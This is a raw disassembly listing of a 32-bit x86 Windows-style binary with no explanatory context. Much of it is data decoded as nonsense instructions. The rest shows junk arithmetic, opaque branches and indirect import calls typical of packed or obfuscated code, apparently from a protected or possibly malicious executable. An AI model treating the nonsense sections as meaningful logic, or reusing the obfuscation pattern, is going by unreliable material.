  40227c:	cmp    esp,DWORD PTR [ecx+esi*8+0x24]
  402280:	(bad)  
  402281:	das    
  402282:	add    DWORD PTR ds:0xcb67,esi
  402287:	ins    BYTE PTR es:[edi],dx
  402288:	sub    ebx,edi
  40228a:	int    0x7f
  40228c:	mov    ebp,0x610247ad
  402291:	fbld   TBYTE PTR [esi]
  402293:	lods   al,BYTE PTR ds:[esi]
  402294:	or     DWORD PTR [edi+esi*4],0xffffffd5
  402298:	cmp    DWORD PTR [ecx*4-0x23d32771],edx
  40229f:	popa   
  4022a0:	mov    esp,0x3da72c51
  4022a5:	(bad)  
  4022a6:	shl    DWORD PTR [ecx+0x4e04d03d],cl
  4022ac:	pusha  
  4022ad:	xchg   BYTE PTR [edx+eax*4],bh
  4022b0:	gs jno 0x4022ef
  4022b3:	lds    ebx,FWORD PTR [edx]
  4022b5:	jl     0x402293
  4022b7:	cmp    al,0x5b
  4022b9:	dec    edi
  4022ba:	mov    al,0x1c
  4022bc:	call   0xc2afd892
  4022c1:	or     al,0x8a
  4022c3:	outs   dx,DWORD PTR ds:[esi]
  4022c4:	jbe    0x4022a0
  4022c6:	call   0x85a6f82a
  4022cb:	int    0x5f
  4022cd:	xchg   esp,eax
  4022ce:	or     al,0xfb
  4022d0:	push   ecx
  4022d1:	cmp    eax,0x45012136
  4022d6:	cmp    DWORD PTR [edi-0x68],edx
  4022d9:	js     0x402343
  4022db:	clc    
  4022dc:	adc    DWORD PTR [eax],ecx
  4022de:	and    bl,ch
  4022e0:	sti    
  4022e1:	push   ss
  4022e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022e3:	scas   al,BYTE PTR es:[edi]
  4022e4:	js     0x402269
  4022e6:	and    ebp,DWORD PTR [ecx]
  4022e8:	scas   al,BYTE PTR es:[edi]
  4022e9:	(bad)  
  4022ea:	in     eax,dx
  4022eb:	daa    
  4022ec:	les    esi,FWORD PTR fs:0xa6464192
  4022f3:	cmp    DWORD PTR [eax+ebx*8-0x34f5158a],ebp
  4022fa:	adc    BYTE PTR [eax+ebx*1-0x1b68c57f],cl
  402301:	and    esi,DWORD PTR [ecx+0x33]
  402304:	std    
  402305:	and    eax,0x506437b1
  40230a:	idiv   BYTE PTR [ecx+0x4857445b]
  402310:	mov    DWORD PTR [eax+0x28a9b6e9],esi
  402316:	mul    BYTE PTR [edi-0x49]
  402319:	xor    ch,BYTE PTR [eax]
  40231b:	pop    esi
  40231c:	xor    ah,BYTE PTR [edx]
  40231e:	std    
  40231f:	push   esp
  402320:	push   ecx
  402321:	arpl   WORD PTR [esp+esi*8],bx
  402324:	in     eax,0x36
  402326:	xchg   ecx,eax
  402327:	sub    eax,0x233350b4
  40232c:	int    0x5f
  40232e:	rol    DWORD PTR [esi+0x104f8f47],1
  402334:	shl    BYTE PTR [ebx],0x5c
  402337:	or     DWORD PTR [eax+eiz*1-0x73c2e7e0],0xb4153a12
  402342:	stos   BYTE PTR es:[edi],al
  402343:	add    esp,DWORD PTR [ecx+0xa]
  402346:	repnz or al,bh
  402349:	xor    ch,BYTE PTR [eax]
  40234b:	push   ebx
  40234c:	mov    WORD PTR [edx],gs
  40234e:	call   0xa192:0xdaaeb7ef
  402355:	pop    ebx
  402356:	push   edx
  402357:	xor    ch,BYTE PTR [ebx]
  402359:	inc    eax
  40235a:	jno    0x402336
  40235c:	jnp    0x4023a4
  40235e:	das    
  40235f:	sbb    ah,bl
  402361:	fiadd  DWORD PTR [eax+edx*4-0x3fe0a9bb]
  402368:	mov    ebx,ebp
  40236a:	ja     0x4023c9
  40236c:	dec    ebp
  40236d:	jo     0x402377
  40236f:	addr16 pusha 
  402371:	adc    ebx,DWORD PTR [esi+0x4add220a]
  402377:	std    
  402378:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402379:	adc    al,0x31
  40237b:	or     DWORD PTR [edi+0x40544e09],edi
  402381:	(bad)  
  402382:	fmulp  st(3),st
  402384:	ja     0x40235b
  402386:	daa    
  402387:	daa    
  402388:	es in  al,0x17
  40238b:	gs mov al,0x9d
  40238e:	dec    esi
  40238f:	lock xor eax,0x2d2525df
  402395:	mov    dh,0x4
  402397:	mov    DWORD PTR ds:0x34caa97c,0x77ec0600
  4023a1:	mov    ebx,0xb8de9a67
  4023a6:	stos   BYTE PTR es:[edi],al
  4023a7:	inc    esp
  4023a8:	in     al,dx
  4023a9:	ds ret 
  4023ab:	test   al,0xd1
  4023ad:	pushf  
  4023ae:	mov    dh,0xfb
  4023b0:	and    BYTE PTR [edi],ch
  4023b2:	mov    BYTE PTR [ebx],ah
  4023b4:	add    DWORD PTR [eax+0x19],ebp
  4023b7:	retf   0x8945
  4023ba:	in     eax,0x55
  4023bc:	lahf   
  4023bd:	xchg   esi,eax
  4023be:	imul   al
  4023c0:	ins    DWORD PTR es:[edi],dx
  4023c1:	retf   
  4023c2:	dec    ebp
  4023c3:	xchg   ebp,eax
  4023c4:	fcom   DWORD PTR [ecx-0x2e446cb]
  4023ca:	outs   dx,BYTE PTR ds:[esi]
  4023cb:	push   esi
  4023cc:	shl    BYTE PTR [ecx+ebp*8-0x24],cl
  4023d0:	pop    ecx
  4023d1:	retf   
  4023d2:	jno    0x4023e6
  4023d4:	fstp   TBYTE PTR [edi+0x1b]
  4023d7:	pop    ds
  4023d8:	jge    0x402406
  4023da:	lahf   
  4023db:	jmp    0x97cc02e4
  4023e0:	mov    ah,0x3a
  4023e2:	inc    eax
  4023e3:	inc    esp
  4023e4:	inc    ecx
  4023e5:	outs   dx,BYTE PTR ds:[esi]
  4023e6:	test   BYTE PTR [ebp+0x32],ah
  4023e9:	daa    
  4023ea:	push   eax
  4023eb:	pop    eax
  4023ec:	outs   dx,BYTE PTR ds:[esi]
  4023ed:	push   esi
  4023ee:	push   edx
  4023ef:	das    
  4023f0:	xor    dl,BYTE PTR [esi+0x55]
  4023f3:	xchg   ebp,eax
  4023f4:	repz jno 0x4023c8
  4023f7:	xchg   ebp,eax
  4023f8:	pop    ds
  4023f9:	jmp    0x2d0f:0x68521ce9
  402400:	add    BYTE PTR [eax],al
  402402:	sbb    DWORD PTR ds:0x428439,0x428461
  40240c:	call   0x422283
  402411:	mov    ecx,DWORD PTR [ebp-0x68]
  402414:	mov    edx,DWORD PTR ds:0x428459
  40241a:	add    DWORD PTR ds:0x428375,edx
  402420:	mov    edx,DWORD PTR [ebp-0x64]
  402423:	sub    DWORD PTR ds:0x428545,ecx
  402429:	xor    eax,ecx
  40242b:	sub    DWORD PTR ds:0x4284dd,edi
  402431:	mov    ecx,DWORD PTR [ebp-0x70]
  402434:	mov    edx,DWORD PTR [ebp-0x6c]
  402437:	neg    DWORD PTR ds:0x42857d
  40243d:	sub    eax,ecx
  40243f:	mov    ecx,DWORD PTR ds:0x422738
  402445:	lea    eax,[eax+ecx*1-0x27d2]
  40244c:	not    edx
  40244e:	mov    ecx,DWORD PTR [ebp-0x1c]
  402451:	adc    edx,DWORD PTR ds:0x4284c5
  402457:	mov    edx,DWORD PTR [ebp-0x2c]
  40245a:	neg    DWORD PTR ds:0x42843d
  402460:	or     ecx,0x4f00
  402466:	and    ecx,edx
  402468:	cmp    DWORD PTR ds:0x42832d,0x0
  40246f:	mov    DWORD PTR ds:0x428549,ebx
  402475:	mov    edx,DWORD PTR ds:0x428445
  40247b:	jmp    0x4024db
  402480:	mov    DWORD PTR ds:0x428425,0xc4d
  40248a:	cmp    DWORD PTR ds:0x42832d,0x0
  402491:	jg     0x4024b5
  402497:	push   DWORD PTR [ebp-0x24]
  40249a:	push   DWORD PTR [ebp-0x28]
  40249d:	call   DWORD PTR ds:0x42dfe8
  4024a3:	xor    edx,DWORD PTR ds:0x428421
  4024a9:	adc    DWORD PTR ds:0x4284ed,ecx
  4024af:	add    edx,0x747e
  4024b5:	or     DWORD PTR ds:0x42854d,0x36ec
  4024bf:	neg    DWORD PTR ds:0x428545
  4024c5:	adc    edx,DWORD PTR ds:0x428341
  4024cb:	sbb    DWORD PTR ds:0x428581,edi
  4024d1:	sbb    DWORD PTR ds:0x42854d,0x669d
  4024db:	mov    edx,DWORD PTR [ebp-0x34]
  4024de:	or     ecx,edx
  4024e0:	xor    ecx,0x5fdd
  4024e6:	cmp    ecx,DWORD PTR [eax]
  4024e8:	mov    DWORD PTR ds:0x4284f1,0x2fd8
  4024f2:	jne    0x408bb3
  4024f8:	mov    ecx,DWORD PTR [esi]
  4024fa:	cmp    DWORD PTR ds:0x428501,0x0
  402501:	mov    DWORD PTR ds:0x428415,edi
  402507:	not    edx
  402509:	mov    DWORD PTR ds:0x4284f1,0x71cc
  402513:	jmp    0x402572
  402518:	mov    eax,ds:0x428501
  40251d:	mov    eax,0x2d63
  402522:	cmp    DWORD PTR ds:0x428501,0x0
  402529:	je     0x40255f
  40252f:	push   0x428369
  402534:	push   DWORD PTR [ebp-0x18]
  402537:	push   0x428255
  40253c:	push   0x6ba7
  402541:	call   DWORD PTR ds:0x42dfec
  402547:	sbb    edx,DWORD PTR ds:0x428375
  40254d:	xor    edx,DWORD PTR ds:0x42836d
  402553:	and    edx,edx
  402555:	mov    DWORD PTR ds:0x428429,0x7db9
  40255f:	add    DWORD PTR ds:0x428465,edx
  402565:	inc    edx
  402566:	and    DWORD PTR ds:0x428339,ecx
  40256c:	or     DWORD PTR ds:0x428481,ecx
  402572:	mov    eax,DWORD PTR [esi+0x4]
  402575:	shrd   ecx,eax,0x2
  402579:	shr    eax,0x2
  40257c:	adc    DWORD PTR ds:0x428371,ecx
  402582:	mov    eax,DWORD PTR [esi]
  402584:	movzx  edx,BYTE PTR ds:0x428431
  40258b:	or     DWORD PTR ds:0x428565,edx
  402591:	mov    edx,DWORD PTR [esi+0x4]
  402594:	shl    eax,0x1e
  402597:	xor    ecx,edi
  402599:	xor    eax,eax
  40259b:	or     eax,ecx
  40259d:	jmp    0x40293e
  4025a2:	cmp    al,0x5
  4025a4:	ja     0x4025d8
  4025a6:	jl     0x40255c
  4025a8:	mov    esp,0xb45d5307
  4025ad:	iret   
  4025ae:	or     BYTE PTR [esi],bl
  4025b0:	xor    bl,ch
  4025b2:	mov    esi,0xbdbebeda
  4025b7:	les    edi,FWORD PTR [esi-0x6988d242]
  4025bd:	mov    WORD PTR [esi],gs
  4025bf:	mov    edx,0xecb09e2b
  4025c4:	fdivr  st,st(1)
  4025c6:	pop    esp
  4025c7:	loopne 0x40256a
  4025c9:	xchg   bx,ax
  4025cb:	jno    0x4025cb
  4025cd:	aaa    
  4025ce:	sbb    BYTE PTR [ebx],0xac
  4025d1:	ja     0x402595
  4025d3:	js     0x40259d
  4025d5:	jle    0x4025cd
  4025d7:	inc    edi
  4025d8:	and    al,0x10
  4025da:	loop   0x4025ea
  4025dc:	and    DWORD PTR [edx],0xffffffa6
  4025df:	(bad)  
  4025e0:	rcl    DWORD PTR [ebx+0xd596525],cl
  4025e6:	push   cs
  4025e7:	mov    dh,0x91
  4025e9:	or     BYTE PTR [ecx],bl
  4025eb:	hlt    
  4025ec:	repz xchg edx,eax
  4025ee:	pop    edx
  4025ef:	(bad)  
  4025f0:	adc    DWORD PTR [esi-0x78009892],ebx
  4025f6:	cs dec esi
  4025f8:	aad    0x4e
  4025fa:	punpcklwd mm5,DWORD PTR [ecx]
  4025fd:	(bad)  [eax+0xac2cc2a]
  402603:	push   cs
  402604:	iret   
  402605:	fnsave [ecx+0x1c]
  402608:	push   cs
  402609:	sti    
  40260a:	popf   
  40260b:	sub    DWORD PTR [edi+eiz*4+0x64db1eb7],ecx
  402612:	add    edi,edi
  402614:	jg     0x402597
  402616:	mov    al,ds:0x9028fa0c
  40261b:	inc    eax
  40261c:	or     DWORD PTR [esi+0x2a],eax
  40261f:	out    dx,al
  402620:	push   ebp
  402621:	shl    DWORD PTR [edx],0xc2
  402624:	nop
  402625:	lock (bad) 
  402627:	push   edx
  402628:	fadd   DWORD PTR [ebp+0x39877e5b]
  40262e:	adc    esi,DWORD PTR [esi-0x7e]
  402631:	adc    ecx,ecx
  402633:	push   0x76
  402635:	(bad)  
  402637:	push   edx
  402638:	gs inc edx
  40263a:	or     BYTE PTR [ebx],dh
  40263c:	dec    esi
  40263d:	cli    
  40263e:	cmp    eax,0x3bfb1596
  402643:	sbb    eax,edi
  402645:	ins    DWORD PTR es:[edi],dx
  402646:	retf   0x3b32
  402649:	pop    es
  40264a:	xchg   ecx,eax
  40264b:	mov    edx,0xb047395
  402650:	mov    cl,0xf2
  402652:	ficomp DWORD PTR [ecx-0x12]
  402655:	std    
  402656:	cdq    
  402657:	rcr    BYTE PTR [eax+eax*1+0x72],cl
  40265b:	nop
  40265c:	into   
  40265d:	fistp  DWORD PTR [esi]
  40265f:	in     al,dx
  402660:	(bad)  
  402661:	pop    esi
  402662:	fbstp  TBYTE PTR [ebp-0x6a]
  402665:	mov    eax,ds:0xd7ce137f
  40266a:	jmp    0x4026ce
  40266c:	rol    ah,1
  40266e:	int3   
  40266f:	icebp  
  402670:	xchg   edi,eax
  402671:	pop    edx
  402672:	sbb    DWORD PTR [ebp+0x28],eax
  402675:	pop    ds
  402676:	sub    al,0x2a
  402678:	xchg   BYTE PTR [edx+esi*1-0x1b],ah
  40267c:	lock fild QWORD PTR [edi-0x29]
  402680:	push   ds
  402681:	xor    edi,esi
  402683:	loope  0x4026db
  402685:	push   eax
  402686:	mov    ebp,0x9379c72f
  40268b:	ret    0x257e
  40268e:	and    al,0xb2
  402690:	das    
  402691:	out    0x6a,al
  402693:	pop    esi
  402694:	sub    BYTE PTR [eax-0x2f],bh
  402697:	mov    ds:0x12f865ac,al
  40269c:	mov    al,BYTE PTR [esi]
  40269e:	xchg   DWORD PTR [ebx-0x54264e53],ebp
  4026a4:	in     eax,dx
  4026a5:	aam    0xca
  4026a7:	inc    edx
  4026a8:	jns    0x402721
  4026aa:	inc    ebx
  4026ab:	gs (bad) 
  4026ad:	adc    esi,DWORD PTR [edx+0x5a]
  4026b0:	mov    dh,0xce
  4026b2:	(bad)  
  4026b4:	xor    ch,BYTE PTR [ebx-0x440441a1]
  4026ba:	jbe    0x402642
  4026bc:	mov    al,0x80
  4026be:	ret    0xc150
  4026c1:	es sbb al,0x38
  4026c4:	pop    ds
  4026c5:	test   BYTE PTR [ebx],bh
  4026c7:	leave  
  4026c8:	sbb    dl,BYTE PTR [ebx]
  4026ca:	add    esi,0x2f
  4026cd:	mov    edi,DWORD PTR [ebx+0x3dee1dd7]
  4026d3:	popa   
  4026d4:	add    al,0xef
  4026d6:	adc    BYTE PTR [edi-0x6e3a9f2c],bh
  4026dc:	out    0x1,eax
  4026de:	adc    al,0x80
  4026e0:	jno    0x402674
  4026e2:	sub    al,0xd5
  4026e4:	mov    ds:0x55c7c6db,eax
  4026e9:	xchg   edx,eax
  4026ea:	xchg   esp,eax
  4026eb:	idiv   eax
  4026ed:	sub    al,0x44
  4026ef:	pop    esp
  4026f0:	adc    eax,0x5da42352
  4026f5:	jo     0x402690
  4026f7:	fmul   DWORD PTR [edx-0x43]
  4026fa:	adc    esi,ebx
  4026fc:	lods   eax,DWORD PTR ds:[esi]
  4026fd:	add    al,0x99
  4026ff:	popfw  
  402701:	pop    edi
  402702:	or     ch,0x3a
  402705:	pop    eax
  402706:	push   esi
  402707:	mov    bl,al
  402709:	dec    edx
  40270a:	push   0x53da307c
  40270f:	out    dx,al
  402710:	dec    esi
  402711:	push   esp
  402712:	push   esp
  402713:	jmp    0x8f93dc86
  402718:	dec    esi
  402719:	push   es
  40271a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40271b:	sti    
  40271c:	sahf   
  40271d:	push   esp
  40271e:	out    dx,al
  40271f:	sub    edi,DWORD PTR [ebx+0x2d]
  402722:	mov    ds:0x61827e7c,al
  402727:	sbb    al,0x60
  402729:	pop    eax
  40272a:	mov    ebp,0xdab2c614
  40272f:	mov    eax,0x6a886715
  402734:	addr16 mov esp,0x36374172
  40273a:	mov    esp,0x5d939952
  40273f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402740:	(bad)  
  402742:	js     0x40275b
  402744:	push   ecx
  402745:	push   esp
  402746:	ins    DWORD PTR es:[edi],dx
  402747:	add    BYTE PTR [esi+0x77],ah
  40274a:	and    al,0x9f
  40274c:	shl    DWORD PTR [ebx],0x4f
  40274f:	aad    0x5e
  402751:	sub    ebx,DWORD PTR [ecx+0x23]
  402754:	arpl   WORD PTR [edx-0x54],di
  402757:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402758:	pop    es
  402759:	fisub  DWORD PTR [edx+ebx*8]
  40275c:	or     ah,dl
  40275e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40275f:	cmc    
  402760:	dec    ecx
  402761:	and    eax,DWORD PTR [eax-0x64]
  402764:	pop    esi
  402765:	(bad)  
  402766:	push   edi
  402767:	jbe    0x40272b
  402769:	push   ecx
  40276a:	jmp    0xf655:0x607fd18f
  402771:	imul   esp,eax,0xfd364d57
  402777:	test   eax,0x5d37b427
  40277c:	pop    edx
  40277d:	nop
  40277e:	les    eax,FWORD PTR [edi+0x3]
  402781:	imul   eax,DWORD PTR [ecx],0x63
  402784:	cmp    eax,0x634ade83
  402789:	jmp    0x4027b1
  40278b:	cmp    eax,0x85c88cf5
  402790:	jne    0x4027a4
  402792:	out    dx,eax
  402793:	add    ebx,ebp
  402795:	mov    WORD PTR [ebx],ds
  402797:	xchg   ebx,eax
  402798:	mov    ecx,0xd270a8c7
  40279d:	dec    edi
  40279e:	pop    esp
  40279f:	push   ebx
  4027a0:	fild   WORD PTR [esi+0x7657b660]
  4027a6:	push   esi
  4027a7:	jecxz  0x4027cf
  4027a9:	imul   ebx,DWORD PTR ds:[esi+0x57],0x19
  4027ae:	aas    
  4027af:	daa    
  4027b0:	mov    esp,0x35e14347
  4027b5:	nop
  4027b6:	or     BYTE PTR ds:0x7ee17fd8,0x48
  4027bd:	out    dx,eax
  4027be:	loop   0x40283d
  4027c0:	or     al,BYTE PTR [ecx+ebp*4+0x12f36d16]
  4027c7:	in     eax,0x45
  4027c9:	loop   0x40279c
  4027cb:	mov    ds:0x9d70fdef,al
  4027d0:	sti    
  4027d1:	(bad)  
  4027d2:	aam    0x6f
  4027d4:	call   0x1cc2:0x487a1683
  4027db:	push   ebp
  4027dc:	mov    ah,0x7d
  4027de:	fimul  WORD PTR [edx+0x4e]
  4027e1:	cli    
  4027e2:	pop    ecx
  4027e3:	scas   eax,DWORD PTR es:[edi]
  4027e4:	test   eax,0xef3a7e5
  4027e9:	cwde   
  4027ea:	(bad)  
  4027eb:	jae    0x40278b
  4027ed:	mov    ds:0xf12c6f85,al
  4027f2:	mov    esi,0xadc2ab2a
  4027f7:	inc    ebx
  4027f8:	push   ecx
  4027f9:	cbw    
  4027fb:	cmp    al,0x74
  4027fd:	dec    esp
  4027fe:	xchg   edi,eax
  4027ff:	das    
  402800:	sub    edx,DWORD PTR [edi+0x1e635fe2]
  402806:	xor    eax,0x602d5451
  40280b:	das    
  40280c:	(bad)  
  40280d:	shl    DWORD PTR [edi-0x7e8d86a3],1
  402813:	add    DWORD PTR [ebx+esi*1],eax
  402816:	or     al,0xaf
  402818:	or     al,0x88
  40281a:	cli    
  40281b:	mov    bl,0x48
  40281d:	popa   
  40281e:	inc    ebp
  40281f:	stos   DWORD PTR es:[edi],eax
  402820:	shl    DWORD PTR [edx],0x0
  402823:	sub    ebx,edx
  402825:	xchg   edi,eax
  402826:	xchg   ebx,eax
  402827:	loop   0x40284d
  402829:	cmp    eax,0xbd96696
  40282e:	mov    bl,0xb6
  402830:	xchg   edi,eax
  402831:	hlt    
  402832:	cmp    eax,0xbffa7fc3
  402837:	xchg   DWORD PTR ds:[eax],ebx
  40283a:	mov    eax,0x975fd113
  40283f:	adc    edi,DWORD PTR [edi-0x3db9ff0f]
  402845:	sub    DWORD PTR [ebp-0x4573461f],ebx
  40284b:	fld    TBYTE PTR [eax-0x43]
  40284e:	addr16 cli 
  402850:	dec    eax
  402851:	sbb    al,0x64
  402853:	xchg   DWORD PTR [ebx+0x2146235a],esi
  402859:	ret    
  40285a:	cmp    BYTE PTR [esi+0x4],bl
  40285d:	(bad)  
  40285e:	outs   dx,BYTE PTR ds:[esi]
  40285f:	pushf  
  402860:	xchg   BYTE PTR [ebp+0x6c79a702],dl
  402866:	leave  
  402867:	or     al,0x61
  402869:	mov    ebx,0x82846667
  40286e:	xor    eax,0x38bc906e
  402873:	xor    DWORD PTR [ecx+0x67899d8],ecx
  402879:	repz dec edx
  40287b:	outs   dx,DWORD PTR ds:[esi]
  40287c:	fimul  DWORD PTR [ebx]
  40287e:	scas   eax,DWORD PTR es:[edi]
  40287f:	ja     0x40280e
  402881:	les    edi,FWORD PTR [ebx-0x5a81322a]
  402887:	std    
  402888:	frndint 
  40288a:	test   BYTE PTR [ebx+edi*4+0x40],al
  40288e:	and    al,BYTE PTR [ecx+0xb]
  402891:	xchg   BYTE PTR [eax-0x4a],dl
  402894:	jp     0x4028c1
  402896:	xor    ch,BYTE PTR [esi+0x34d218d6]
  40289c:	pop    edi
  40289d:	xor    al,0x9a
  40289f:	add    DWORD PTR [esi+ebp*2+0x68],eax
  4028a3:	pop    es
  4028a4:	es or  eax,0x702f4b12
  4028aa:	aad    0x44
  4028ac:	ret    0x50dd
  4028af:	or     al,0x16
  4028b1:	mov    edi,0x2bba40e7
  4028b6:	jno    0x402861
  4028b8:	es int3 
  4028ba:	jmp    0x402900
  4028bc:	sub    BYTE PTR [edx-0x274af78d],0x7b
  4028c3:	cmp    esi,eax
  4028c5:	mov    eax,0x57d4d4d7
  4028ca:	mov    ebp,0xc5e6d1e8
  4028cf:	mov    eax,0x257b77b1
  4028d4:	das    
  4028d5:	(bad)  
  4028d6:	sbb    DWORD PTR [edi],ecx
  4028d8:	jbe    0x39360fef
  4028de:	or     eax,0x921c258f
  4028e3:	cld    
  4028e4:	adc    DWORD PTR [esi+0x59b0740b],ecx
  4028ea:	mov    edx,0xde367229
  4028ef:	ins    DWORD PTR es:[edi],dx
  4028f0:	js     0x40294b
  4028f2:	imul   eax,esp,0x14
  4028f5:	and    BYTE PTR [esp+eiz*8-0x6cc9da20],dl
  4028fc:	repnz cli 
  4028fe:	pop    edi
  4028ff:	dec    ebp
  402900:	into   
  402901:	mov    ebx,DWORD PTR [eax+0x648b1fae]
  402907:	add    eax,0x59deefc4
  40290c:	push   edi
  40290d:	js     0x40296f
  40290f:	or     eax,0xff24f2c6
  402914:	jne    0x4028cb
  402916:	and    edx,DWORD PTR cs:[edx]
  402919:	xor    eax,0x70239018
  40291e:	lds    eax,FWORD PTR [ebx+edx*2-0x65]
  402922:	mov    cl,0x77
  402924:	iret   
  402925:	test   al,0xf1
  402927:	sar    esp,1
  402929:	or     eax,0x9c07af4a
  40292e:	add    bh,BYTE PTR [esi+ecx*2+0x47d703d6]
  402935:	sbb    al,0x6d
  402937:	aad    0x1a
  402939:	cmp    DWORD PTR [esi],edi
  40293b:	dec    esp
  40293c:	xchg   esi,eax
  40293d:	les    ecx,FWORD PTR [ebx+0x13bec4d]
  402943:	mov    DWORD PTR ds:0x428429,0x7e19
  40294d:	jne    0x402a3a
  402953:	cmp    DWORD PTR ds:0x4284f1,0x0
  40295a:	mov    DWORD PTR ds:0x428545,edi
  402960:	mov    ecx,0x5bac
  402965:	mov    ecx,0x785
  40296a:	jmp    0x4029c0
  40296f:	mov    DWORD PTR ds:0x4284f5,0x7d3d
  402979:	mov    eax,ds:0x428351
  40297e:	cmp    DWORD PTR ds:0x4284f1,0x0
  402985:	jl     0x4029a6
  40298b:	push   0x25e9
  402990:	call   DWORD PTR ds:0x42e238
  402996:	and    ecx,0x7efc
  40299c:	and    DWORD PTR ds:0x428481,0x428369
  4029a6:	sub    edx,edx
  4029a8:	and    DWORD PTR ds:0x428555,0x3b56
  4029b2:	mov    edx,DWORD PTR ds:0x42852d
  4029b8:	mov    edx,DWORD PTR [edx]
  4029ba:	add    DWORD PTR ds:0x428445,edx
  4029c0:	mov    eax,DWORD PTR [ebp-0xc]
  4029c3:	mov    ecx,DWORD PTR [ebp+0x20]
  4029c6:	sub    DWORD PTR ds:0x428375,edi
  4029cc:	xor    DWORD PTR [eax],ecx
  4029ce:	mov    eax,DWORD PTR [ebp-0xc]
  4029d1:	or     edx,ecx
  4029d3:	mov    ecx,DWORD PTR [ebp+0x18]
  4029d6:	or     DWORD PTR ds:0x428451,ebx
  4029dc:	mov    edx,DWORD PTR [ebp+0x1c]
  4029df:	add    DWORD PTR ds:0x42834d,0x2a87
  4029e9:	shrd   ecx,edx,0x2
  4029ed:	sub    DWORD PTR ds:0x42845d,0x428435
  4029f7:	mov    DWORD PTR [ebp-0x14],ecx
  4029fa:	mov    ecx,DWORD PTR [ebp+0x18]
  4029fd:	xor    DWORD PTR [ebp-0x14],edi
  402a00:	shr    edx,0x2
  402a03:	xor    edx,0x4270
  402a09:	mov    edx,DWORD PTR [ebp+0x1c]
  402a0c:	sbb    DWORD PTR ds:0x428409,0x428425
  402a16:	xor    edx,edx
  402a18:	and    DWORD PTR ds:0x428579,0x428331
  402a22:	or     edx,DWORD PTR [ebp-0x14]
  402a25:	or     DWORD PTR ds:0x428451,0x6ae7
  402a2f:	shl    ecx,0x1e
  402a32:	xor    DWORD PTR ds:0x428369,edx
  402a38:	sub    DWORD PTR [eax],edx
  402a3a:	xor    ecx,ecx
  402a3c:	add    ecx,DWORD PTR ds:0x4284c1
  402a42:	mov    eax,ds:0x428539
  402a47:	sub    eax,ecx
  402a49:	add    ecx,DWORD PTR [ecx+eax*1]
  402a4c:	mov    eax,ds:0x422580
  402a51:	add    edx,DWORD PTR ds:0x428365
  402a57:	mov    ecx,DWORD PTR [ebp-0xc]
  402a5a:	cmp    DWORD PTR ds:0x428419,0x0
  402a61:	not    edx
  402a63:	not    DWORD PTR ds:0x42834d
  402a69:	movzx  edx,WORD PTR ds:0x42833d
  402a70:	jmp    0x402ae1
  402a75:	mov    edx,0x6743
  402a7a:	cmp    DWORD PTR ds:0x428419,0x0
  402a81:	jg     0x402ac1
  402a87:	push   0x8e71
  402a8c:	push   DWORD PTR [ebp-0x1c]
  402a8f:	call   DWORD PTR ds:0x42dff0
  402a95:	movzx  edx,WORD PTR ds:0x428469
  402a9c:	sbb    edx,DWORD PTR ds:0x428561
  402aa2:	mov    DWORD PTR ds:0x428469,edx
  402aa8:	movzx  edx,BYTE PTR ds:0x428471
  402aaf:	adc    DWORD PTR ds:0x428549,edx
  402ab5:	or     edx,0x3af6
  402abb:	and    edx,DWORD PTR ds:0x42832d
  402ac1:	or     DWORD PTR ds:0x428369,0x67f9
  402acb:	add    edx,0x3b45
  402ad1:	or     edx,DWORD PTR ds:0x4284d1
  402ad7:	adc    DWORD PTR ds:0x428549,0x3eb0
  402ae1:	mov    eax,DWORD PTR [eax]
  402ae3:	cmp    DWORD PTR ds:0x428351,0x0
  402aea:	mov    DWORD PTR ds:0x4284d9,0xab9
  402af4:	mov    edx,DWORD PTR ds:0x42836d
  402afa:	mov    DWORD PTR ds:0x428341,0x238f
  402b04:	jmp    0x402b79
  402b09:	mov    DWORD PTR ds:0x428575,ecx
  402b0f:	cmp    DWORD PTR ds:0x428351,0x0
  402b16:	ja     0x402b5f
  402b1c:	push   DWORD PTR [ebp-0x14]
  402b1f:	push   0x428191
  402b24:	push   DWORD PTR [ebp-0x10]
  402b27:	push   0x428238
  402b2c:	push   DWORD PTR [ebp-0x18]
  402b2f:	push   0x24b6
  402b34:	call   DWORD PTR ds:0x42e23c
  402b3a:	mov    edx,DWORD PTR ds:0x428375
  402b40:	sub    DWORD PTR ds:0x42835d,edx
  402b46:	sbb    DWORD PTR ds:0x428449,ebx
  402b4c:	movzx  edx,BYTE PTR ds:0x42832d
  402b53:	adc    DWORD PTR ds:0x42846d,edx
  402b59:	add    DWORD PTR ds:0x42856d,ebx
  402b5f:	xor    edx,edx
  402b61:	or     edx,DWORD PTR ds:0x42857d
  402b67:	xor    edx,DWORD PTR ds:0x4284e5
  402b6d:	mov    DWORD PTR ds:0x42857d,edx
  402b73:	add    edx,0x71a6
  402b79:	add    eax,DWORD PTR [ecx]
  402b7b:	sub    ecx,0x1eef
  402b81:	mov    DWORD PTR [ebp-0x14],eax
  402b84:	or     ecx,DWORD PTR ds:0x42845d
  402b8a:	mov    ecx,DWORD PTR [ebx]
  402b8c:	mov    eax,DWORD PTR [ebx+0x4]
  402b8f:	shrd   ecx,eax,0x2
  402b93:	cmp    DWORD PTR ds:0x42832d,0x0
  402b9a:	mov    DWORD PTR ds:0x4284d1,0x61cd
  402ba4:	mov    edx,DWORD PTR ds:0x428339
  402baa:	mov    DWORD PTR ds:0x428345,edx
  402bb0:	jmp    0x402c95
  402bb5:	mov    DWORD PTR ds:0x428349,0x124b
  402bbf:	mov    DWORD PTR ds:0x428421,0x5ddc
  402bc9:	cmp    DWORD PTR ds:0x42832d,0x0
  402bd0:	jle    0x402bf9
  402bd6:	push   0x6f74
  402bdb:	call   DWORD PTR ds:0x42e0ac
  402be1:	sub    DWORD PTR ds:0x4284ed,edx
  402be7:	and    edx,DWORD PTR ds:0x428425
  402bed:	mov    edx,DWORD PTR ds:0x428575
  402bf3:	xor    DWORD PTR ds:0x4284c5,edx
  402bf9:	mov    edx,DWORD PTR ds:0x4285b9
  402bff:	mov    edx,DWORD PTR [edx]
  402c01:	xor    DWORD PTR ds:0x428429,edx
  402c07:	and    DWORD PTR ds:0x42834d,0x245f
  402c11:	cmp    DWORD PTR ds:0x428341,0x0
  402c18:	mov    DWORD PTR ds:0x4284e1,0x70c6
  402c22:	not    edx
  402c24:	mov    edx,0x462e
  402c29:	jmp    0x402c95
